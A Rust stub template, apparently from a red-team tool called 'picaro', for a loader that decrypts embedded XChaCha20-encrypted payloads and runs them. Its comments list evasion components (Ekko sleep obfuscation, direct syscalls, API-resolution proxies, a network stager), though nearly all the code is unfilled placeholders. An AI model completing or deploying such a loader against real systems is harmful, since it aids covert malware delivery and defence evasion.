//! Stub generated automatically by picaro.
//!
//! Runs an ordered chain of technique steps. Each Execution step decrypts an
//! embedded payload with XChaCha20-Poly1305 and runs it with its technique; each
//! Preparation step adjusts the process state; each Control step orchestrates the
//! chain (`living_off_the_land` launches a process, `sleep` waits). The entry
//! point (`fn main`, or the exports of a host-loaded DLL) is injected above.
//! Part of a red team research tool; not code for malicious use.

use chacha20poly1305::{
    aead::{Aead, KeyInit},
    XChaCha20Poly1305, Key, XNonce,
};

$STUB_HELPERS$

// --- Shared sleep-obfuscation runtime (injected; ekko) ---
$SLEEP_RUNTIME_BLOCK$

$TLS_HANDOFF_BLOCK$

$ENTRY_BLOCK$

fn run() -> Result<i32, String> {
$TLS_PROVISION$    init_syscalls()?;
    #[allow(unused_mut, unused_assignments)]
    let mut last: i32 = 0;
$STEP_RUNNER_BODY$
    Ok(last)
}

// --- Step modules (injected: per-step techniques) ---
$STEP_MODULES$

// --- Syscall layer (injected; no-op unless build.stub.syscalls is set) ---
$SYSCALLS_BLOCK$

// --- Payload arguments (injected; shared by the execution techniques) ---
$ARGS_BLOCK$

// --- Payload import resolution (injected; shared by the execution techniques) ---
$IMPORTS_BLOCK$

// --- API resolution proxies (injected; from build.stub.api_resolution) ---
$API_RESOLUTION_BLOCK$

// --- Network stager (injected; present when a step uses network_stager) ---
$STAGER_BLOCK$
